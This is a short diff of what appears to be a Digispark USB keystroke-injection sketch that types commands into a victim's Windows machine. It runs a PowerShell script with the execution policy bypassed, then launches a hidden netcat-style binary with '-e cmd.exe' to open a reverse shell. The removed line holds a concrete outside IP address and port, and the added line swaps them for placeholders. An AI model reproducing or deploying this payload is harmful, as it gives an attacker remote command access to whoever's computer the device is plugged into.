@@ -19,7 +19,7 @@ void setup()
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(50);
-  DigiKeyboard.println("START /MIN a.exe 90.200.240.149 1337 -e cmd.exe -d & exit");
+  DigiKeyboard.println("START /MIN a.exe IP PORT -e cmd.exe -d & exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   digitalWrite(1, HIGH);
 }
